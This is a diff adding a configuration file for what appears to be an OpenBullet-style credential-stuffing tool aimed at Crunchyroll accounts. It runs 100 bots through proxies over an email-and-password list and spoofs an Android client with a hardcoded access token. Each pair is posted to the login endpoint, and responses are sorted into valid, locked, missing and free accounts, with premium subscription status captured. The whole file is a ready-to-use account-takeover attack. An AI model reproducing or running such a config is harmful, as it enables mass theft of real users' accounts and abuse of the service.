@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "Crunchyroll",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-02T02:45:44.6401707-05:00",
+  "AdditionalInfo": "Max 100 Bots",
+  "Author": "DARK",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#SessionID_Request REQUEST POST "https://api.crunchyroll.com/start_session.0.json" 
+  CONTENT "locale=enUS&device_id=ffffffff-8890-a339-c4c1-03907679fb22&device_type=com.crunchyroll.crunchyroid&access_token=Scwg9PRRZ19iVwD&version=439" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: api.crunchyroll.com" 
+#SessionID_Parse PARSE "<SOURCE>" LR "session_id\":\"" "\",\"country_code" -> VAR "SessionID" 
+#Login REQUEST POST "https://api.crunchyroll.com/login.0.json" 
+  CONTENT "account=<USER>&password=<PASS>&locale=enUS&session_id=<SessionID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Key_Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "user\",\"user_id" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect login information." 
+    KEY "You forgot to put in your password." 
+    KEY "Your account has been locked." 
+    KEY " not found.\"}" 
+    KEY "internal_server_error" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"premium\":\"\"" 
+#Subscription_Type_Parse PARSE "<SOURCE>" LR "premium\":\"" "\",\"is_publisher" -> CAP "Subscribed to" 
